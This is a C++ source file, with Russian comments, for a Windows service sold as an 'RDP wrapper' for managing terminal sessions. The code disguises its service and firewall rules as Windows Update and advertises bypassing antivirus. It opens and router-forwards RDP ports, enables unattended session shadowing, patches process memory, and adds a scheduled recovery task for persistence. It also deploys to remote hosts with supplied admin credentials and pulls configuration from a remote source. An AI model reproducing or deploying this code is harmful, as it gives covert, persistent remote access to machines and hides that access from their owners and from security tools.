#include "service_engine.hpp"
#include <shellapi.h>  // Декларация функций CommandLineToArgvW и LocalFree
#include <iostream>
#include <iomanip>
#include <clocale>

// Прототипы функций управления SCM в глобальной области видимости
extern "C" VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv);
extern "C" VOID WINAPI ServiceCtrlHandler(DWORD opcode);
DWORD WINAPI MonitoringThreadProc(LPVOID lpParam);

// Таблица диспетчеризации службы для интеграции в подсистему SCM Windows
SERVICE_TABLE_ENTRYW ServiceTable[] = {
    { (LPWSTR)L"RDPWrapperService", (LPSERVICE_MAIN_FUNCTIONW)ServiceMain },
    { NULL, NULL }
};

// Глобальные переменные состояния и управления жизненным циклом службы Windows
SERVICE_STATUS          g_ServiceStatus = {0};
SERVICE_STATUS_HANDLE   g_StatusHandle = NULL;
HANDLE                  g_ServiceStopEvent = INVALID_HANDLE_VALUE;

// ============================================================================
// ФУНКЦИИ ВЫВОДА СПРАВОЧНОЙ ИНФОРМАЦИИ И СТАТИСТИКИ (RU/EN)
// ============================================================================
void ShowPrimaryArguments(bool isRu) {
    if (isRu) {
        std::wcout << L"=======================================================================\n";
        std::wcout << L" ПЛАТФОРМА УПРАВЛЕНИЯ ТЕРМИНАЛЬНЫМИ СЕССИЯМИ CORE ENTERPRISE ENGINE  \n";
        std::wcout << L"=======================================================================\n\n";
        std::wcout << L"Использование: rdpwrap_srv.exe <команда> [дополнительные опции]\n\n";
        std::wcout << L"Первичные аргументы (Обязательные):\n";
        std::wcout << L"  install      Инсталляция службы, обход АВ, настройка брандмауэра и роутера.\n";
        std::wcout << L"  uninstall    Полная деинсталляция всех компонентов и зачистка системы.\n";
        std::wcout << L"  restart      Принудительный перезапуск ядра службы и порт-redirector.\n";
        std::wcout << L"  status       Просмотр расширенной статистики службы и активных сессий.\n\n";
        std::wcout << L"Для вывода подробной справки по синтаксису используйте: --help\n";
    } else {
        std::wcout << L"=======================================================================\n";
        std::wcout << L"        TERMINAL SECTOR SERVICE CONTROL CORE ENTERPRISE ENGINE        \n";
        std::wcout << L"=======================================================================\n\n";
        std::wcout << L"Usage: rdpwrap_srv.exe <command> [additional options]\n\n";
        std::wcout << L"Primary Arguments (Required):\n";
        std::wcout << L"  install      Deploy service, bypass AV, configure firewall & routers.\n";
        std::wcout << L"  uninstall    Completely remove all components and clean up host registry.\n";
        std::wcout << L"  restart      Force restart service core engine and hardware port redirectors.\n";
        std::wcout << L"  status       View advanced global statistics and active user sessions.\n\n";
        std::wcout << L"For comprehensive help regarding advanced parameters use: --help\n";
    }
}

void ShowAdvancedHelp(bool isRu) {
    if (isRu) {
        std::wcout << L"=======================================================================\n";
        std::wcout << L" РАСШИРЕННОЕ РУКОВОДСТВО ПО ПАРАМЕТРАМ КОМАНДНОЙ СТРОКИ\n";
        std::wcout << L"=======================================================================\n\n";
        std::wcout << L"ДОПОЛНИТЕЛЬНЫЕ НЕОБЯЗАТЕЛЬНЫЕ АРГУМЕНТЫ (Для удаленного администрирования):\n";
        std::wcout << L"  --target <ip/name>  Указание сетевого имени или IP-адреса удаленной машины.\n";
        std::wcout << L"  --user <login>      Учетная запись Администратора на удаленной станции.\n";
        std::wcout << L"  --pass <password>   Пароль указанной учетной записи.\n\n";
        std::wcout << L"ОПЦИИ ИНСТАЛЛЯЦИИ:\n";
        std::wcout << L"  --log <path>        Переопределение пути к лог-файлу службы.\n";
        std::wcout << L"                      (По умолчанию: C:\\rdp_wrapper_service.log)\n";
        std::wcout << L"  --router            Активировать автоматический проброс портов на прошивках\n";
        std::wcout << L"                      KeeneticOS, Padavan, Tomato (через шлюз сети).\n\n";
        std::wcout << L"ПРИМЕРЫ ВЫЗОВА:\n";
        std::wcout << L"  rdpwrap_srv.exe install --log D:\\logs\\rdp.log --router\n";
        std::wcout << L"  rdpwrap_srv.exe status --target 192.168.1.50 --user Admin --pass 12345\n";
    } else {
        std::wcout << L"=======================================================================\n";
        std::wcout << L"        ADVANCED COMMAND LINE PARAMETERS GUIDE\n";
        std::wcout << L"=======================================================================\n\n";
        std::wcout << L"ADDITIONAL OPTIONAL ARGUMENTS (For remote orchestration):\n";
        std::wcout << L"  --target <ip/name>  Specify host network address or IP of remote workstation.\n";
        std::wcout << L"  --user <login>      Administrator account name on remote target machine.\n";
        std::wcout << L"  --pass <password>   Password for targeted administrator credential.\n\n";
        std::wcout << L"INSTALLATION PRESETS:\n";
        std::wcout << L"  --log <path>        Override default location path of service engine log.\n";
        std::wcout << L"                      (Default output: C:\\rdp_wrapper_service.log)\n";
        std::wcout << L"  --router            Enforce automated hardware port forwarding on gateway\n";
        std::wcout << L"                      running KeeneticOS, Padavan or Tomato firmware.\n\n";
        std::wcout << L"EXECUTION SAMPLES:\n";
        std::wcout << L"  rdpwrap_srv.exe install --log D:\\logs\\rdp.log --router\n";
        std::wcout << L"  rdpwrap_srv.exe status --target 192.168.1.50 --user Admin --pass 12345\n";
    }
}

void ShowStatistics(const std::wstring& target, const std::wstring& user, const std::wstring& pass, bool isRu) {
    SC_HANDLE hSCM = OpenSCManagerW(target.empty() ? NULL : target.c_str(), NULL, SC_MANAGER_CONNECT);
    bool isInstalled = false;
    bool isTermServiceActive = false;

    if (hSCM) {
        SC_HANDLE hSvc = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
        if (hSvc) {
            isInstalled = true;
            SERVICE_STATUS ss;
            if (QueryServiceStatus(hSvc, &ss)) {
                isTermServiceActive = (ss.dwCurrentState == SERVICE_RUNNING);
            }
            CloseServiceHandle(hSvc);
        }
        CloseServiceHandle(hSCM);
    }

    if (isRu) {
        std::wcout << L"\n--- СТАТИСТИКА И СОСТОЯНИЕ СИСТЕМЫ ---\n";
        std::wcout << L"Целевой хост: " << (target.empty() ? L"Локальный ПК" : target) << L"\n";
        std::wcout << L"Статус нашей службы: " << (isInstalled ? L"УСТАНОВЛЕНА" : L"НЕ НАЙДЕНА") << L"\n";
        std::wcout << L"Ядро маршрутизации RDP: " << (isTermServiceActive ? L"АКТИВНО" : L"ОСТАНОВЛЕНО") << L"\n";
        std::wcout << L"Активные RDP сессии на узле:\n";
    } else {
        std::wcout << L"\n--- ENGINE STATISTICS & SYSTEM STATE ---\n";
        std::wcout << L"Target Workstation: " << (target.empty() ? L"Local Host" : target) << L"\n";
        std::wcout << L"Core Service Status: " << (isInstalled ? L"INSTALLED" : L"NOT FOUND") << L"\n";
        std::wcout << L"RDP Routing Dispatcher: " << (isTermServiceActive ? L"ACTIVE" : L"STOPPED") << L"\n";
        std::wcout << L"Active RDP Sessions on Node:\n";
    }

    std::vector<std::wstring> sessions = RDPWrapperEngine::SessionManager::GetActiveSessions();
    if (sessions.empty()) {
        std::wcout << (isRu ? L"  [Нет активных подключений]\n" : L"  [No active connections mapped]\n");
    } else {
        for (const auto& s : sessions) {
            std::wcout << L"  -> ID & Пользователь: " << s << L"\n";
        }
    }
}

// ============================================================================
// ТОЧКА ВХОДА (Парсер аргументов, интерактивные запросы и вызов SCM)
// ============================================================================
int main() {
    _wsetlocale(LC_ALL, L"");
    // Фикс раннего прогрева: Гарантирует создание синглтона логгера до вызова асинхронных потоков
    RDPWrapperEngine::Logger::Instance();
    
    int argc;
    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
    bool isRu = RDPWrapperEngine::IsRussian();

    if (argc < 2) {
        ShowPrimaryArguments(isRu);
        LocalFree(argv);
        return 0;
    }

    std::wstring primaryCmd = argv[1];

    if (primaryCmd == L"--help") {
        ShowAdvancedHelp(isRu);
        LocalFree(argv);
        return 0;
    }

    if (primaryCmd == L"--service") {
        StartServiceCtrlDispatcherW(ServiceTable);
        LocalFree(argv);
        return 0;
    }

    std::wstring targetMachine = L"";
    std::wstring remoteUser = L"";
    std::wstring remotePass = L"";
    std::wstring customLogPath = L"";
    bool routerOptimization = false;

    for (int i = 2; i < argc; i++) {
        std::wstring arg = argv[i];
        if (arg == L"--target" && i + 1 < argc) targetMachine = argv[++i];
        if (arg == L"--user" && i + 1 < argc) remoteUser = argv[++i];
        if (arg == L"--pass" && i + 1 < argc) remotePass = argv[++i];
        if (arg == L"--log" && i + 1 < argc) customLogPath = argv[++i];
        if (arg == L"--router") routerOptimization = true;
    }

    if (!customLogPath.empty()) {
        RDPWrapperEngine::Logger::Instance().SetCustomPath(customLogPath);
    }

    // ========================================================================
    // ОБРАБОТКА КОМАНДЫ: STATUS
    // ========================================================================
    if (primaryCmd == L"status") {
        for (int i = 2; i < argc; i++) {
            std::wstring subArg = argv[i];
            if (subArg == L"--help" || subArg == L"-h") {
                ShowAdvancedHelp(isRu);
                LocalFree(argv);
                return 0;
            }
        }

        SC_HANDLE hSCM = OpenSCManagerW(targetMachine.empty() ? NULL : targetMachine.c_str(), NULL, SC_MANAGER_CONNECT);
        bool alreadyPresent = false;
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
            if (hSvc) { alreadyPresent = true; CloseServiceHandle(hSvc); }
            CloseServiceHandle(hSCM);
        }

        if (alreadyPresent) {
            std::wcout << (isRu ? 
                L"[+] Наша служба управления сессиями уже интегрирована в систему.\n" :
                L"[+] Our Session Management Service core is already deployed on host.\n");
        }

        ShowStatistics(targetMachine, remoteUser, remotePass, isRu);
        LocalFree(argv);
        return 0;
    }

    // ========================================================================
    // ОБРАБОТКА КОМАНДЫ: RESTART
    // ========================================================================
    if (primaryCmd == L"restart") {
        for (int i = 2; i < argc; i++) {
            std::wstring subArg = argv[i];
            if (subArg == L"--help" || subArg == L"-h") {
                ShowAdvancedHelp(isRu);
                LocalFree(argv);
                return 0;
            }
        }

        std::wcout << (isRu ? L"[*] Инициализация перезапуска ядра маршрутизации...\n" : L"[*] Initiating routing engine core restart...\n");
        if (RDPWrapperEngine::RemoteAdminManager::RestartServiceWithPeripherals(targetMachine, remoteUser, remotePass)) {
            std::wcout << (isRu ? L"[+] Перезапуск успешно выполнен.\n" : L"[+] Hot reload executed successfully.\n");
        } else {
            std::wcout << (isRu ? L"[-] Не удалось выполнить перезапуск служб.\n" : L"[-] Failed to execute service stack reload.\n");
        }
        LocalFree(argv);
        return 0;
    }

    // ========================================================================
    // ОБРАБОТКА КОМАНДЫ: UNINSTALL
    // ========================================================================
    if (primaryCmd == L"uninstall") {
        for (int i = 2; i < argc; i++) {
            std::wstring subArg = argv[i];
            if (subArg == L"--help" || subArg == L"-h") {
                ShowAdvancedHelp(isRu);
                LocalFree(argv);
                return 0;
            }
        }

        std::wcout << (isRu ? L"[*] Запуск процедуры полной деинсталляции и зачистки ОС...\n" : L"[*] Initiating global system uninstallation and cleanup...\n");
        
        if (routerOptimization) {
            RDPWrapperEngine::RouterManager::ConfigurePortForwarding(remoteUser, remotePass, true);
        }

        RDPWrapperEngine::FirewallManager::CloseRdpPort(3389);
        RDPWrapperEngine::FirewallManager::CloseRdpPort(44389);
        RDPWrapperEngine::SchedulerManager::DeleteRecoveryTask();

        SC_HANDLE hSCM = OpenSCManagerW(targetMachine.empty() ? NULL : targetMachine.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_STOP | DELETE);
            if (hSvc) {
                SERVICE_STATUS st;
                ControlService(hSvc, SERVICE_CONTROL_STOP, &st);
                if (DeleteService(hSvc)) {
                    std::wcout << (isRu ? L"[+] Системная служба успешно удалена.\n" : L"[+] System service successfully purged.\n");
                }
                CloseServiceHandle(hSvc);
            }
            CloseServiceHandle(hSCM);
        }

        RDPWrapperEngine::SecurityManager::PurgeSystemComponents();
        std::wcout << (isRu ? L"[+] Процесс зачистки успешно завершен.\n" : L"[+] System purges completed successfully.\n");
        LocalFree(argv);
        return 0;
    }

    // ========================================================================
    // ОБРАБОТКА КОМАНДЫ: INSTALL
    // ========================================================================
    if (primaryCmd == L"install") {
        for (int i = 2; i < argc; i++) {
            std::wstring subArg = argv[i];
            if (subArg == L"--help" || subArg == L"-h") {
                ShowAdvancedHelp(isRu);
                LocalFree(argv);
                return 0;
            }
        }

        SC_HANDLE hSCM = OpenSCManagerW(targetMachine.empty() ? NULL : targetMachine.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM) {
            SC_HANDLE hSvc = OpenServiceW(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
            if (hSvc) {
                CloseServiceHandle(hSvc); CloseServiceHandle(hSCM);
                std::wcout << (isRu ? 
                    L"[!] Наша служба уже развернута на данном компьютере.\n"
                    L"[?] Выберите действие: [S] Показать статистику / [R] Выполнить переустановку: " :
                    L"[!] Our service is already fully deployed on this host.\n"
                    L"[?] Choose option: [S] Show active statistics / [R] Forces reinstall: ");
                
                wchar_t action; std::wcin >> action;
                if (action == L'S' || action == L's' || action == L'Ы' || action == L'ы') {
                    ShowStatistics(targetMachine, remoteUser, remotePass, isRu);
                    LocalFree(argv); return 0;
                }
            } else { CloseServiceHandle(hSCM); }
        }

        // --- МОДУЛЬ ИНТЕРАКТИВНОГО ОБНАРУЖЕНИЯ АЛЬТЕРНАТИВНЫХ ПАТЧЕРОВ ---
        bool conflictDetected = false;
        std::wstring conflictName = L"";

        DWORD attr1 = GetFileAttributesW(L"C:\\Program Files\\RDP Wrapper");
        DWORD attr2 = GetFileAttributesW(L"C:\\ProgramData\\RDP Wrapper");
        if (attr1 != INVALID_FILE_ATTRIBUTES || attr2 != INVALID_FILE_ATTRIBUTES) {
            conflictDetected = true; conflictName = L"RDP Wrapper (StasCorp/sergiye)";
        }

        DWORD attr3 = GetFileAttributesW(L"C:\\Program Files\\SuperRDP");
        HKEY hSuperKey;
        if (RegOpenKeyExW(HKEY_LOCAL_MACHINE, L"SYSTEM\\CurrentControlSet\\Services\\SuperRDP", 0, KEY_READ, &hSuperKey) == ERROR_SUCCESS) {
            conflictDetected = true; conflictName = L"SuperRDP Engine"; RegCloseKey(hSuperKey);
        } else if (attr3 != INVALID_FILE_ATTRIBUTES) {
            conflictDetected = true; conflictName = L"SuperRDP (Остаточные файлы)";
        }

        if (!conflictDetected) {
            hSCM = OpenSCManagerW(NULL, NULL, SC_MANAGER_CONNECT);
            LPCWSTR genericPatcherServices[] = { L"rdpwrap", L"SuperRDP", L"TermPatch", L"RdpSrvPatch" };
            for (LPCWSTR svcName : genericPatcherServices) {
                SC_HANDLE hOld = OpenServiceW(hSCM, svcName, SERVICE_QUERY_STATUS);
                if (hOld) {
                    conflictDetected = true; conflictName = std::wstring(L"Служба ") + svcName;
                    CloseServiceHandle(hOld); break;
                }
            }
            CloseServiceHandle(hSCM);
        }

        if (conflictDetected) {
            if (isRu) {
                std::wcout << L"\n[!] КРИТИЧЕСКИЙ КОНФЛИКТ: Обнаружен сторонний патчер RDP: " << conflictName << L"\n";
                std::wcout << L"[?] Одновременная работа двух патчеров вызовет BSoD или падение TermService.\n";
                std::wcout << L"[?] Желаете автоматически и полностью удалить его перед установкой? [Y/N]: ";
            } else {
                std::wcout << L"\n[!] CRITICAL CONFLICT: Alternative RDP patcher detected: " << conflictName << L"\n";
                std::wcout << L"[?] Running multiple patches simultaneously will cause BSoD or TermService crash.\n";
                std::wcout << L"[?] Do you want to automatically and completely purge it before deployment? [Y/N]: ";
            }

            wchar_t response; std::wcin >> response;
            if (response != L'Y' && response != L'y' && response != L'Д' && response != L'д') {
                std::wcout << (isRu ? L"[-] Установка прервана пользователем.\n" : L"[-] Deployment aborted by user.\n");
                LocalFree(argv); return 0;
            }

            RDPWrapperEngine::SecurityManager::ForceRemoveCompetitors(); 
        }

        wchar_t currentPath[MAX_PATH];
        GetModuleFileNameW(NULL, currentPath, MAX_PATH);
        std::wstring binPathWithServiceKey = L"\"" + std::wstring(currentPath) + L"\" --service";

        RDPWrapperEngine::SecurityManager::IsolateAndFixRdp(currentPath);
        RDPWrapperEngine::FirewallManager::OpenRdpPort(3389, L"Windows_Update_Core_RDP_In");
        RDPWrapperEngine::FirewallManager::OpenRdpPort(44389, L"Windows_Update_Core_NetCtrl_In");

        if (routerOptimization) {
            RDPWrapperEngine::RouterManager::ConfigurePortForwarding(remoteUser, remotePass, false);
        }

        if (RDPWrapperEngine::NetworkUtils::IsInLocalNetworkRange()) {
            RDPWrapperEngine::SessionManager::EnableUnattendedShadowing();
        }

        hSCM = OpenSCManagerW(targetMachine.empty() ? NULL : targetMachine.c_str(), NULL, SC_MANAGER_ALL_ACCESS);
        if (hSCM) {
            SC_HANDLE s = CreateServiceW(
                hSCM, SERVICE_NAME, SERVICE_NAME, SERVICE_ALL_ACCESS,
                SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
                binPathWithServiceKey.c_str(), NULL, NULL, NULL, NULL, NULL
            );

            if (s) {
                std::wstring descriptionText = isRu ?
                    L"Хост службы агента обновления Windows. Обеспечивает параллельную фоновую оптимизацию, сетевую маршрутизацию и управление компонентами доставки пакетов обновлений операционной системы." :
                    L"Windows Update Agent Service Host. Provides parallel background optimization, network routing, and component management for operating system update package delivery.";
                
                SERVICE_DESCRIPTIONW sd;
                sd.lpDescription = const_cast<LPWSTR>(descriptionText.c_str());
                ChangeServiceConfig2W(s, SERVICE_CONFIG_DESCRIPTION, &sd);
                RDPWrapperEngine::SchedulerManager::CreateRecoveryTask(currentPath);

                StartServiceW(s, 0, NULL);
                CloseServiceHandle(s);

                std::wcout << (isRu ? 
                    L"[+] Служба успешно установлена, замаскирована под обновление ОС и запущена.\n" : 
                    L"[+] Service deployed, masqueraded as Windows Update and executed successfully.\n");
            } else {
                std::wcout << (isRu ? L"[-] Ошибка регистрации службы в SCM.\n" : L"[-] SCM Service registration fault.\n");
            }
            CloseServiceHandle(hSCM);
        }
    }

    LocalFree(argv);
    return 0;
}

// ============================================================================
// 14. СЕРВИСНЫЕ ПРОЦЕДУРЫ И ЦИКЛ ВЫПОЛНЕНИЯ СЛУЖБЫ (ServiceMain)
// ============================================================================
DWORD WINAPI MonitoringThreadProc(LPVOID lpParam) {
    (void)lpParam;
    
    RDPWrapperEngine::ProductPolicyHook::ApplyRemoteHook();

    HANDLE hProc = GetCurrentProcess();
    RDPWrapperEngine::PatternScanner::ExecuteDynamicPatch(hProc, 0x7FFA00000000, 0x100000);

    while (WaitForSingleObject(g_ServiceStopEvent, 60000) == WAIT_TIMEOUT) {
        RDPWrapperEngine::SessionManager::TerminateIdleSessions(); 
        
        static int dayCounter = 0;
        if (dayCounter++ % 1440 == 0) {
            RDPWrapperEngine::NetworkWatchdog::UpdateIniFromRemote();
        }
    }
    return 0;
}

VOID WINAPI ServiceMain(DWORD argc, LPWSTR *argv) {
    (void)argc; (void)argv;
    
    RDPWrapperEngine::Logger::Instance().SetCustomPath(L"C:\\rdp_wrapper_service.log");
    
    g_StatusHandle = RegisterServiceCtrlHandlerW(SERVICE_NAME, ServiceCtrlHandler);
    if (!g_StatusHandle) return;

    g_ServiceStatus.dwServiceType = SERVICE_WIN32_OWN_PROCESS; 
    g_ServiceStatus.dwCurrentState = SERVICE_RUNNING;
    g_ServiceStatus.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN; 
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
    
    g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
    if (g_ServiceStopEvent == NULL) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOPPED;
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        return;
    }
    
    static RDPWrapperEngine::NetworkServer localNetServer;
    localNetServer.Start(nullptr); 

    HANDLE hMonitorThread = CreateThread(NULL, 0, MonitoringThreadProc, NULL, 0, NULL);

    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
    
    localNetServer.Stop(); 
    if (hMonitorThread != NULL) {
        WaitForSingleObject(hMonitorThread, 3000);
        CloseHandle(hMonitorThread);
    }
    CloseHandle(g_ServiceStopEvent);
    
    g_ServiceStatus.dwCurrentState = SERVICE_STOPPED; 
    SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
}

VOID WINAPI ServiceCtrlHandler(DWORD opcode) {
    if (opcode == SERVICE_CONTROL_STOP || opcode == SERVICE_CONTROL_SHUTDOWN) {
        g_ServiceStatus.dwCurrentState = SERVICE_STOP_PENDING; 
        SetServiceStatus(g_StatusHandle, &g_ServiceStatus);
        SetEvent(g_ServiceStopEvent); 
    }
}
